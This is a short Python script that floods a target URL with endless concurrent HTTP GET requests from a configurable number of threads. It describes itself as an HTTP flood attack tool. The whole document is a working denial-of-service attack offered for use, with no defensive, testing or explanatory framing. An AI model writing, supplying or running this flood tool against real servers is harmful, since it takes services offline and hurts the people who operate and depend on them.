import requests
import threading
import argparse

def flood_http(target_url, num_threads):
    def attack():
        while True:
            try:
                response = requests.get(target_url)
                print(f"Sent request, received {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {e}")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run an HTTP flood attack.")
    parser.add_argument("target_url", help="The target HTTP server URL (e.g., http://192.168.1.100:8000)")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    args = parser.parse_args()

    flood_http(args.target_url, args.threads)
